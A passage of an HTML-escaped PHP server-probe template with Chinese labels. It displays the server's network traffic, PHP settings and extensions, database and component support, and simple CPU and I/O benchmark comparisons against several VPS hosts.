		&lt;td colspan=&quot;5&quot; class=&quot;w_number&quot;&gt;&lt;span id=&quot;loadAvg&quot;&gt;&lt;?php echo $load;?&gt;&lt;/span&gt;&lt;/td&gt;
	&lt;/tr&gt;

&lt;/table&gt;

&lt;?&#125;?&gt;



&lt;?php if (false !== ($strs = @file(&quot;/proc/net/dev&quot;))) : ?&gt;

&lt;table&gt;

    &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;网络使用状况&lt;/th&gt;&lt;/tr&gt;

&lt;?php for ($i = 2; $i &lt; count($strs); $i++ ) : ?&gt;

&lt;?php preg_match_all( &quot;/([^\s]+):[\s]&#123;0,&#125;(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)\s+(\d+)/&quot;, $strs[$i], $info );?&gt;

     &lt;tr&gt;

        &lt;td width=&quot;13%&quot;&gt;&lt;?php echo $info[1][0]?&gt; : &lt;/td&gt;
        &lt;td width=&quot;29%&quot;&gt;入网: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetInput&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetInput[$i]?&gt;&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
		&lt;td width=&quot;14%&quot;&gt;实时: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetInputSpeed&lt;?php echo $i?&gt;&quot;&gt;0B/s&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
        &lt;td width=&quot;29%&quot;&gt;出网: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetOut&lt;?php echo $i?&gt;&quot;&gt;&lt;?php echo $NetOut[$i]?&gt;&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;
		&lt;td width=&quot;14%&quot;&gt;实时: &lt;font color='#CC0000'&gt;&lt;span id=&quot;NetOutSpeed&lt;?php echo $i?&gt;&quot;&gt;0B/s&lt;/span&gt;&lt;/font&gt;&lt;/td&gt;

    &lt;/tr&gt;

&lt;?php endfor; ?&gt;

&lt;/table&gt;

&lt;?php endif; ?&gt;



&lt;table width=&quot;100%&quot; cellpadding=&quot;3&quot; cellspacing=&quot;0&quot; align=&quot;center&quot;&gt;

  &lt;tr&gt;

    &lt;th colspan=&quot;4&quot;&gt;PHP已编译模块检测&lt;/th&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td colspan=&quot;4&quot;&gt;&lt;span class=&quot;w_small&quot;&gt;

&lt;?php

$able=get_loaded_extensions();

foreach ($able as $key=&gt;$value) &#123;

	if ($key!=0 &amp;&amp; $key%13==0) &#123;

		echo '&lt;br /&gt;';

	&#125;

	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;

&#125;

?&gt;&lt;/span&gt;

    &lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_php&quot;&gt;&lt;/a&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;PHP相关参数&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;PHP信息（phpinfo）：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;

		&lt;?php

		$phpSelf = $_SERVER[PHP_SELF] ? $_SERVER[PHP_SELF] : $_SERVER[SCRIPT_NAME];

		$disFuns=get_cfg_var(&quot;disable_functions&quot;);

		?&gt;

    &lt;?php echo (false!==eregi(&quot;phpinfo&quot;,$disFuns))? '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;' :&quot;&lt;a href='$phpSelf?act=phpinfo' target='_blank'&gt;PHPINFO&lt;/a&gt;&quot;;?&gt;

    &lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;PHP版本（php_version）：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo PHP_VERSION;?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP运行方式：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo strtoupper(php_sapi_name());?&gt;&lt;/td&gt;

    &lt;td&gt;脚本占用最大内存（memory_limit）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;memory_limit&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP安全模式（safe_mode）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;safe_mode&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;POST方法提交最大限制（post_max_size）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;post_max_size&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;上传文件最大限制（upload_max_filesize）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;upload_max_filesize&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;浮点型数据显示的有效位数（precision）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;precision&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;脚本超时时间（max_execution_time）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;max_execution_time&quot;);?&gt;秒&lt;/td&gt;

    &lt;td&gt;socket超时时间（default_socket_timeout）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;default_socket_timeout&quot;);?&gt;秒&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;PHP页面根目录（doc_root）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;doc_root&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;用户根目录（user_dir）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;user_dir&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dl()函数（enable_dl）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;enable_dl&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;指定包含文件目录（include_path）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;include_path&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;显示错误信息（display_errors）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;display_errors&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;自定义全局变量（register_globals）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_globals&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;数据反斜杠转义（magic_quotes_gpc）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;&quot;&amp;lt;?...?&amp;gt;&quot;短标签（short_open_tag）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;short_open_tag&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;&quot;&amp;lt;% %&amp;gt;&quot;ASP风格标记（asp_tags）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;asp_tags&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;忽略重复错误信息（ignore_repeated_errors）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_errors&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;忽略重复的错误源（ignore_repeated_source）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;ignore_repeated_source&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;报告内存泄漏（report_memleaks）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;report_memleaks&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;自动字符串转义（magic_quotes_gpc）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_gpc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;外部字符串自动转义（magic_quotes_runtime）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;magic_quotes_runtime&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;打开远程文件（allow_url_fopen）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;声明argv和argc变量（register_argc_argv）：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;register_argc_argv&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Cookie 支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isset($_COOKIE)?'&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
    &lt;td&gt;拼写检查（ASpell Library）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;aspell_check_raw&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt;
   &lt;tr&gt;
    &lt;td&gt;高精度数学运算（BCMath）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;PREL相容语法（PCRE）：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;/td&gt;
   &lt;tr&gt;
    &lt;td&gt;PDF文档支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;pdf_close&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;SNMP网络管理协议：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;snmpget&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;VMailMgr邮件处理：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;vm_adduser&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;Curl支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;curl_init&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 
   &lt;tr&gt;
    &lt;td&gt;SMTP支持：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?'&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;' : '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
    &lt;td&gt;SMTP地址：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo get_cfg_var(&quot;SMTP&quot;)?get_cfg_var(&quot;SMTP&quot;):'&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';?&gt;&lt;/td&gt;
  &lt;/tr&gt; 

	&lt;tr&gt;
		&lt;td&gt;默认支持函数（enable_functions）：&lt;/td&gt;
		&lt;td colspan=&quot;3&quot;&gt;&lt;a href='&lt;?php echo $phpSelf;?&gt;?act=Function' target='_blank' class='static'&gt;请点这里查看详细！&lt;/a&gt;&lt;/td&gt;		
	&lt;/tr&gt;
	&lt;tr&gt;
		&lt;td&gt;被禁用的函数（disable_functions）：&lt;/td&gt;
		&lt;td colspan=&quot;3&quot; class=&quot;word&quot;&gt;
&lt;?php 
$disFuns=get_cfg_var(&quot;disable_functions&quot;);
if(empty($disFuns))
&#123;
	echo '&lt;font color=red&gt;×&lt;/font&gt;';
&#125;
else
&#123; 
	//echo $disFuns;
	$disFuns_array =  explode(',',$disFuns);
	foreach ($disFuns_array as $key=&gt;$value) 
	&#123;
		if ($key!=0 &amp;&amp; $key%5==0) &#123;
			echo '&lt;br /&gt;';
	&#125;
	echo &quot;$value&amp;nbsp;&amp;nbsp;&quot;;
&#125;	
&#125;

?&gt;
		&lt;/td&gt;
	&lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_module&quot;&gt;&lt;/a&gt;

&lt;!--组件信息--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot; &gt;组件支持&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;FTP支持：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;ftp_login&quot;);?&gt;&lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;XML解析支持：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;xml_set_object&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Session支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;session_start&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;Socket支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;socket_accept&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Calendar支持&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun('cal_days_in_month');?&gt;
	&lt;/td&gt;

    &lt;td&gt;允许URL打开文件：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo show(&quot;allow_url_fopen&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;GD库支持：&lt;/td&gt;

    &lt;td&gt;

    &lt;?php

        if(function_exists(gd_info)) &#123;

            $gd_info = @gd_info();

	        echo $gd_info[&quot;GD Version&quot;];

	    &#125;else&#123;echo '&lt;font color=&quot;red&quot;&gt;×&lt;/font&gt;';&#125;

	?&gt;&lt;/td&gt;

    &lt;td&gt;压缩文件支持(Zlib)：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;gzclose&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;IMAP电子邮件系统函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;imap_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;历法运算函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;JDToGregorian&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;正则表达式函数库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;preg_match&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;WDDX支持：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;wddx_add_vars&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Iconv编码转换：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;iconv&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;mbstring：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mb_eregi&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;高精度数学运算：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;bcadd&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;LDAP目录协议：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ldap_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;MCrypt加密处理：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mcrypt_cbc&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;哈稀计算：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mhash_count&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;a name=&quot;w_module_other&quot;&gt;&lt;/a&gt;
&lt;!--第三方组件信息--&gt;
&lt;table&gt;
  &lt;tr&gt;&lt;th colspan=&quot;4&quot; &gt;第三方组件&lt;/th&gt;&lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width=&quot;32%&quot;&gt;Zend版本&lt;/td&gt;
    &lt;td width=&quot;18%&quot;&gt;&lt;?php $zend_version = zend_version();if(empty($zend_version))&#123;echo '&lt;font color=red&gt;×&lt;/font&gt;';&#125;else&#123;echo $zend_version;&#125;?&gt;&lt;/td&gt;
    &lt;td width=&quot;32%&quot;&gt;
&lt;?php
$PHP_VERSION = PHP_VERSION;
$PHP_VERSION = substr($PHP_VERSION,2,1);
if($PHP_VERSION &gt; 2)
&#123;
	echo &quot;ZendGuardLoader[启用]&quot;;
&#125;
else
&#123;
	echo &quot;Zend Optimizer&quot;;
&#125;
?&gt;
	&lt;/td&gt;
    &lt;td width=&quot;18%&quot;&gt;&lt;?php if($PHP_VERSION &gt; 2)&#123;echo (get_cfg_var(&quot;zend_loader.enable&quot;))?'&lt;font color=green&gt;√&lt;/font&gt;':'&lt;font color=red&gt;×&lt;/font&gt;';&#125; else&#123;if(function_exists('zend_optimizer_version'))&#123;	echo zend_optimizer_version();&#125;else&#123;	echo (get_cfg_var(&quot;zend_optimizer.optimization_level&quot;)||get_cfg_var(&quot;zend_extension_manager.optimizer_ts&quot;)||get_cfg_var(&quot;zend.ze1_compatibility_mode&quot;)||get_cfg_var(&quot;zend_extension_ts&quot;))?'&lt;font color=green&gt;√&lt;/font&gt;':'&lt;font color=red&gt;×&lt;/font&gt;';&#125;&#125;?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;eAccelerator&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('eAccelerator'))!='')&#123;echo phpversion('eAccelerator');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
    &lt;td&gt;ioncube&lt;/td&gt;
    &lt;td&gt;&lt;?php if(extension_loaded('ionCube Loader'))&#123;   $ys = ioncube_loader_iversion();   $gm = &quot;.&quot;.(int)substr($ys,3,2);   echo ionCube_Loader_version().$gm;&#125;else&#123;echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125;?&gt;&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;XCache&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('XCache'))!='')&#123;echo phpversion('XCache');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
    &lt;td&gt;APC&lt;/td&gt;
    &lt;td&gt;&lt;?php if((phpversion('APC'))!='')&#123;echo phpversion('APC');&#125;else&#123; echo &quot;&lt;font color=red&gt;×&lt;/font&gt;&quot;;&#125; ?&gt;&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;

&lt;a name=&quot;w_db&quot;&gt;&lt;/a&gt;

&lt;!--数据库支持--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;4&quot;&gt;数据库支持&lt;/th&gt;&lt;/tr&gt;

  &lt;tr&gt;

    &lt;td width=&quot;32%&quot;&gt;MySQL 数据库：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;mysql_close&quot;);?&gt;

    &lt;?php
    if(function_exists(&quot;mysql_get_server_info&quot;)) &#123;

        $s = @mysql_get_server_info();

        $s = $s ? '&amp;nbsp; mysql_server 版本：'.$s : '';

	    $c = '&amp;nbsp; mysql_client 版本：'.@mysql_get_client_info();

        echo $s;

    &#125;

    ?&gt;

	&lt;/td&gt;

    &lt;td width=&quot;32%&quot;&gt;ODBC 数据库：&lt;/td&gt;

    &lt;td width=&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;odbc_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Oracle 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ora_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;SQL Server 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mssql_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dBASE 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;dbase_close&quot;);?&gt;&lt;/td&gt;

    &lt;td&gt;mSQL 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;msql_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;SQLite 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php if(extension_loaded('sqlite3')) &#123;$sqliteVer = SQLite3::version();echo '&lt;font color=green&gt;√&lt;/font&gt;　';echo &quot;SQLite3　Ver &quot;;echo $sqliteVer[versionString];&#125;else &#123;echo isfun(&quot;sqlite_close&quot;);if(isfun(&quot;sqlite_close&quot;) == '&lt;font color=&quot;green&quot;&gt;√&lt;/font&gt;') &#123;echo &quot;&amp;nbsp; 版本： &quot;.@sqlite_libversion();&#125;&#125;?&gt;&lt;/td&gt;

    &lt;td&gt;Hyperwave 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;hw_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Postgre SQL 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;pg_close&quot;); ?&gt;&lt;/td&gt;

    &lt;td&gt;Informix 数据库：&lt;/td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ifx_close&quot;);?&gt;&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;DBA 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dba_close&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;DBM 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dbmclose&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt;    
  &lt;tr&gt;
    &lt;td&gt;FilePro 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;filepro_fieldcount&quot;);?&gt;&lt;/td&gt;
    &lt;td&gt;SyBase 数据库：&lt;/td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;sybase_close&quot;);?&gt;&lt;/td&gt;
  &lt;/tr&gt; 

&lt;/table&gt;

&lt;a name=&quot;w_performance&quot;&gt;&lt;/a&gt;&lt;a name=&quot;bottom&quot;&gt;&lt;/a&gt;

&lt;form action=&quot;&lt;?php echo $_SERVER[PHP_SELF].&quot;#bottom&quot;;?&gt;&quot; method=&quot;post&quot;&gt;

&lt;!--服务器性能检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;服务器性能检测&lt;/th&gt;&lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td width=&quot;19%&quot;&gt;参照对象&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;整数运算能力检测&lt;br /&gt;(1+1运算300万次)&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;浮点运算能力检测&lt;br /&gt;(圆周率开平方300万次)&lt;/td&gt;

    &lt;td width=&quot;17%&quot;&gt;数据I/O能力检测&lt;br /&gt;(读取10K文件1万次)&lt;/td&gt;

    &lt;td width=&quot;30%&quot;&gt;CPU信息&lt;/td&gt;

  &lt;/tr&gt;
  &lt;tr align=&quot;center&quot;&gt;
    &lt;td align=&quot;left&quot;&gt;美国 LinodeVPS&lt;/td&gt;
    &lt;td&gt;0.357秒&lt;/td&gt;
    &lt;td&gt;0.802秒&lt;/td&gt;
    &lt;td&gt;0.023秒&lt;/td&gt;
    &lt;td align=&quot;left&quot;&gt;4 x Xeon L5520 @ 2.27GHz&lt;/td&gt;
  &lt;/tr&gt; 

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 PhotonVPS.com&lt;/td&gt;

    &lt;td&gt;0.431秒&lt;/td&gt;

    &lt;td&gt;1.024秒&lt;/td&gt;

    &lt;td&gt;0.034秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;8 x Xeon E5520 @ 2.27GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;德国 SpaceRich.com&lt;/td&gt;

    &lt;td&gt;0.421秒&lt;/td&gt;

    &lt;td&gt;1.003秒&lt;/td&gt;

    &lt;td&gt;0.038秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;4 x Core i7 920 @ 2.67GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 RiZie.com&lt;/td&gt;

    &lt;td&gt;0.521秒&lt;/td&gt;

    &lt;td&gt;1.559秒&lt;/td&gt;

    &lt;td&gt;0.054秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;2 x Pentium4 3.00GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;埃及 CitynetHost.com&lt;/a&gt;&lt;/td&gt;

    &lt;td&gt;0.343秒&lt;/td&gt;

    &lt;td&gt;0.761秒&lt;/td&gt;

    &lt;td&gt;0.023秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;2 x Core2Duo E4600 @ 2.40GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td align=&quot;left&quot;&gt;美国 IXwebhosting.com&lt;/td&gt;

    &lt;td&gt;0.535秒&lt;/td&gt;

    &lt;td&gt;1.607秒&lt;/td&gt;

    &lt;td&gt;0.058秒&lt;/td&gt;

    &lt;td align=&quot;left&quot;&gt;4 x Xeon E5530 @ 2.40GHz&lt;/td&gt;

  &lt;/tr&gt;

  &lt;tr align=&quot;center&quot;&gt;

    &lt;td&gt;本台服务器&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valInt;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;整型测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valFloat;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;浮点测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;?php echo $valIo;?&gt;&lt;br /&gt;&lt;input class=&quot;btn&quot; name=&quot;act&quot; type=&quot;submit&quot; value=&quot;IO测试&quot; /&gt;&lt;/td&gt;

    &lt;td&gt;&lt;/td&gt;

  &lt;/tr&gt;

&lt;/table&gt;

&lt;input type=&quot;hidden&quot; name=&quot;pInt&quot; value=&quot;&lt;?php echo $valInt;?&gt;&quot; /&gt;

&lt;input type=&quot;hidden&quot; name=&quot;pFloat&quot; value=&quot;&lt;?php echo $valFloat;?&gt;&quot; /&gt;

&lt;input type=&quot;hidden&quot; name=&quot;pIo&quot; value=&quot;&lt;?php echo $valIo;?&gt;&quot; /&gt;

&lt;a name=&quot;w_networkspeed&quot;&gt;&lt;/a&gt;
&lt;!--网络速度测试--&gt;
&lt;table&gt;
	&lt;tr&gt;&lt;th colspan=&quot;3&quot;&gt;网络速度测试&lt;/th&gt;&lt;/tr&gt;
  &lt;tr&gt;
    &lt;td width=&quot;19%&quot; align=&quot;center&quot;&gt;&lt;input name=&quot;act&quot; type=&quot;submit&quot; class=&quot;btn&quot; value=&quot;开始测试&quot; /&gt;
        &lt;br /&gt;
	向客户端传送1000k字节数据&lt;br /&gt;
	带宽比例按理想值计算
	&lt;/td&gt;
    &lt;td width=&quot;81%&quot; align=&quot;center&quot; &gt;

  &lt;table align=&quot;center&quot; width=&quot;550&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; &gt;
    &lt;tr &gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;带宽&lt;/td&gt;
	&lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;1M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;2M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;3M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;4M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;5M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;6M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;7M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;8M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;9M&lt;/td&gt;
    &lt;td height=&quot;15&quot; width=&quot;50&quot;&gt;10M&lt;/td&gt;
    &lt;/tr&gt;
   &lt;tr&gt;
    &lt;td colspan=&quot;11&quot; class=&quot;suduk&quot; &gt;&lt;table align=&quot;center&quot; width=&quot;550&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot; height=&quot;8&quot; class=&quot;suduk&quot;&gt;
    &lt;tr&gt;
